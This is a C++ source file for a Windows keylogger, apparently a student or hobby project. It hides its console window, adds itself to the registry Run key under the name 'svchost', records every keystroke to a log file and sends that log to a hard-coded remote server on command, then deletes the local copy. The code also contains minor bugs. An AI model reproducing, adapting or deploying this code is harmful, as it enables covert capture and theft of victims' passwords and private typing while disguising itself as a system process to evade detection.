//-----------------------------------------------------------------------------------------
//Authors: Maslov Mikhail, Sokolov Igor, Bolotin Petr, Kaloshin Pavel.
//-----------------------------------------------------------------------------------------

//-----------------------------------------------------------------------------------------
//     This is a keylogger part. Can be compiled via MS Visual Studio 2013.              //
//-----------------------------------------------------------------------------------------

//-----------------------------------------------------------------------------------------
// This program adds itself to autorun. Saves key logs in svchost.log. Must be compiled with
// some strange name not to be recognized in Task Manager.
//-----------------------------------------------------------------------------------------

//DO NOT DELETE COMMENTS ABOVE THIS.

#include "header.h"

#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_SERVER_PORT 27015
#define DEFAULT_BUFLEN 512
#define	DEFAULT_SERVER_IP "192.168.137.254"
#define bufsize 512
#define TimesToTry  10 //How many times trying to send a message to server if something goes wrong
#define TimeForReconnecting 100

#define _CRT_SECURE_NO_WARNINGS //VS2013 require this stuff, not to show warnings.
#define BUFSIZE 512//80
#define MIN_DIFF 120//2 min//
#define CHECK_TIME	t_time2 = clock()/CLOCKS_PER_SEC; \
if (t_time2 - t_time1 >= MIN_DIFF)\
					{fputs("\n", file); \
					fputs(asctime(t_m), file); \
					t_time1 = t_time2; }\
					//time		



int test_key(void);
int create_key(char *);
int get_keys(SOCKET, int);



int main(void)
{
	//*****
	//INIT_WINAPI_DEPENDENT
	//*****

	HWND stealth; /*creating stealth (window is not visible)*/
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, 0); //SW_HIDE - Hides the window and activates another window.

	//*****
	//INIT_WINAPI_DEPENDENT
	//*****
	

	//*****
	//INIT_SOCKET
	//*****

	char OUR_DEFAULT_PORT_CHAR[] = "27015";
	//Initialize WSA
	WSADATA wsaData;
	int result;
	result = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (result != 0)
	{
		//std::cout << "Error in function WSAStartup: " << result << std::endl;
		//getchar();
		return 1;
	}

	// Create a socket to send our IP to server
	SOCKET clientSocket = INVALID_SOCKET;
	clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (clientSocket == INVALID_SOCKET)
	{

		WSACleanup();
		return 1;
	}

	//*****
	//INIT_SOCKET
	//*****

	//*****
	//CONNECTING_TO_SOCKET
	//*****
	sockaddr_in clientService;
	clientService.sin_family = AF_INET;
	inet_pton(AF_INET, DEFAULT_SERVER_IP, &(clientService.sin_addr));
	clientService.sin_port = htons(DEFAULT_SERVER_PORT);

	while (true)
	{
		result = connect(clientSocket, (reinterpret_cast<SOCKADDR*>(&clientService)), sizeof(clientService));
		if (result == 0)
		{
			//printf("success!!!\n");//
			//getchar();
			break;
		}
	}

	//*****
	//CONNECTING_TO_SOCKET
	//*****

	int test, create;
	test = test_key();/*check if key is available for opening*/

	if (test == 2)/*create key*/
	{
		char *path = "c:\\%windir%\\svchost.exe";/*the path in which the file needs to be*/
		create = create_key(path);

	}


	int t = get_keys(clientSocket, result);

	return t;
}


int test_key(void)
{
	int check;
	HKEY hKey;
	char path[BUFSIZE];
	DWORD buf_length = BUFSIZE;
	int reg_key;

	reg_key = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_QUERY_VALUE, &hKey);//opens the specified key
	if (reg_key != 0)
	{
		check = 1;
		return check;
	}

	reg_key = RegQueryValueEx(hKey, L"svchost", NULL, NULL, (LPBYTE)path, &buf_length);//returns the type of data and the specified value name associated with an open registry key

	if ((reg_key != 0) || (buf_length>BUFSIZE))
		check = 2;
	if (reg_key == 0)
		check = 0;

	RegCloseKey(hKey);
	return check;
}

int create_key(char *path)
{
	int reg_key, check;

	HKEY hkey;

	reg_key = RegCreateKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);//It creates the specified key. If the key already exists in the registry, the function opens it
	if (reg_key == 0)
	{
		RegSetValueEx((HKEY)hkey, L"svchost", 0, REG_SZ, (BYTE *)path, strlen(path));//saves the data in the values of open registry key. She, too, may establish additional value and type information for the specified key
		//REG_SZ ~ KEY_QUERY_VALUE 

		check = 0;
		return check;
	}
	if (reg_key != 0)
		check = 1;

	return check;
}


int get_keys(SOCKET clientSocket, int result)
{
	FILE *file;
	time_t t;
	struct tm *t_m;
	t = time(NULL);
	t_m = localtime(&t);

	file = fopen("svchost.log", "a+");
	fputs("\n\nLast running \n", file);
	fputs(asctime(t_m), file);
	fclose(file);
	short character;

	int t_time1 = clock() / CLOCKS_PER_SEC;
	int t_time2;
	int counter = 0; //I want to work with connection not every itteration


	while (1)
	{
		Sleep(10);/*to prevent 100% cpu usage*/
		counter++;
		//*****
		//COMMUNICATING_WITH_SERVER
		//*****
		//printf("Enter point\n");
			int rezult = 0;

			int Errors_sock = send(clientSocket, "", 0, 1);
		//	printf("Errors_sock = %d, counter = %d\n", Errors_sock, counter);
			if (Errors_sock >= 0)
				counter = 0;
			if (Errors_sock == -1)
				rezult = -1;
			if (rezult== -1 && counter==TimeForReconnecting)
			{
		//		printf("reconnecting...\n");
				counter = 0;
				closesocket(clientSocket);
		//		printf("...Closing Success...\n");
				clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		//		printf("...Sochet Success...\n");
				sockaddr_in clientService;
				clientService.sin_family = AF_INET;
				inet_pton(AF_INET, DEFAULT_SERVER_IP, &(clientService.sin_addr));
				clientService.sin_port = htons(DEFAULT_SERVER_PORT);

				result = connect(clientSocket, (reinterpret_cast<SOCKADDR*>(&clientService)), sizeof(clientService));
		//		printf("result = %d, errno = %d\n", result, errno);
			}

			if (rezult == 0)
			{
				// get data
				char buf[bufsize];
				char x = buf[bufsize];
				u_long flag = 1;
				ioctlsocket(clientSocket, FIONBIO, &flag);
				//		printf("so sad :(\n");
				int r = recv(clientSocket, buf, bufsize, 0);

				if (r > 0)
					// If you sent a 0 - send files
				{
					if (buf[0] == '0')
					{
						//	printf("sending log!\n");
						char data[bufsize];
						char filetosend[] = "svchost.log";
						//FILE *in;
						//	printf("...Opening file\n");
						//file = 
						int rez = fopen_s(&file, filetosend, "rb");
						if (rez == 0)
						{
							while (!feof(file))
							{
								//		printf("...Sending file\n");
								int b = fread(data, 1, bufsize, file);
								send(clientSocket, data, static_cast<int>(strlen(data)), 0);

							}
							//	printf("...Closingfile\n");
							fclose(file);
							//	printf("...Removing file\n");
							remove("svchost.log");
							//	printf("...Success\n");
							buf[0] = 5;
						}
					}
					// If you sent 1 - disables
					if (buf[0] == '1')
					{
						closesocket(clientSocket);
						WSACleanup();
						return 0;
					}
					if (buf[0] = '2')
					{
						counter = 0;
						closesocket(clientSocket);
						clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
						sockaddr_in clientService;
						clientService.sin_family = AF_INET;
						inet_pton(AF_INET, DEFAULT_SERVER_IP, &(clientService.sin_addr));
						clientService.sin_port = htons(DEFAULT_SERVER_PORT);
						result = connect(clientSocket, (reinterpret_cast<SOCKADDR*>(&clientService)), sizeof(clientService));
					}
				}
			}

		//*****
		//COMMUNICATING_WITH_SERVER
		//*****

		//	printf("continue...\n");

		for (character = 8; character <= 222; character++)
		{
			if (GetAsyncKeyState(character) == -32767)
				//sets, pressed or unpressed condition is key at the time, 
				//when the function is called and whether a key is pressed after the previous call GetAsyncKeyState().
			{
				file = fopen("svchost.log", "a+");
				CHECK_TIME

					//FILE *file;

					if (file == NULL)
					{
						return 1;
					}
				if (file != NULL)
				{
					if ((character >= 39) && (character <= 64))
					{
						fputc(character, file);
						fclose(file);
						break;
					}
					else if ((character>64) && (character<91))
					{
						character += 32;
						fputc(character, file);
						fclose(file);
						break;
					}
					else
					{
						switch (character)
						{
						case VK_SPACE:
							fputc(' ', file);
							fclose(file);
							break;
						case VK_SHIFT:
							fputs("[SHIFT]", file);
							fclose(file);
							break;
						case VK_RETURN:
							fputs("\n[ENTER]", file);
							fclose(file);
							break;
						case VK_BACK:
							fputs("[BACKSPACE]", file);
							fclose(file);
							break;
						case VK_TAB:
							fputs("[TAB]", file);
							fclose(file);
							break;
						case VK_CONTROL:
							fputs("[CTRL]", file);
							fclose(file);
							break;
						case VK_DELETE:
							fputs("[DEL]", file);
							fclose(file);
							break;
						case VK_OEM_1:
							fputs("[;:]", file);
							fclose(file);
							break;
						case VK_OEM_2:
							fputs("[/?]", file);
							fclose(file);
							break;
						case VK_OEM_3:
							fputs("[`~]", file);
							fclose(file);
							break;
						case VK_OEM_4:
							fputs("[ [{ ]", file);
							fclose(file);
							break;
						case VK_OEM_5:
							fputs("[\\|]", file);
							fclose(file);
							break;
						case VK_OEM_6:
							fputs("[ ]} ]", file);
							fclose(file);
							break;
						case VK_OEM_7:
							fputs("['\"]", file);
							fclose(file);
							break;

						case VK_OEM_PLUS:
							fputc('+', file);
							fclose(file);
							break;
						case VK_OEM_COMMA:
							fputc(',', file);
							fclose(file);
							break;
						case VK_OEM_MINUS:
							fputc('-', file);
							fclose(file);
							break;
						case VK_OEM_PERIOD:
							fputc('.', file);
							fclose(file);
							break;

						case VK_NUMPAD0:
							fputc('0', file);
							fclose(file);
							break;
						case VK_NUMPAD1:
							fputc('1', file);
							fclose(file);
							break;
						case VK_NUMPAD2:
							fputc('2', file);
							fclose(file);
							break;
						case VK_NUMPAD3:
							fputc('3', file);
							fclose(file);
							break;
						case VK_NUMPAD4:
							fputc('4', file);
							fclose(file);
							break;
						case VK_NUMPAD5:
							fputc('5', file);
							fclose(file);
							break;
						case VK_NUMPAD6:
							fputc('6', file);
							fclose(file);
							break;
						case VK_NUMPAD7:
							fputc('7', file);
							fclose(file);
							break;
						case VK_NUMPAD8:
							fputc('8', file);
							fclose(file);
							break;
						case VK_NUMPAD9:
							fputc('9', file);
							fclose(file);
							break;
						case VK_CAPITAL:
							fputs("[CAPS LOCK]", file);
							fclose(file);
							break;
						default:
							fclose(file);
							break;
						}
					}
				}
			}
		}

	}
	return EXIT_SUCCESS;
}

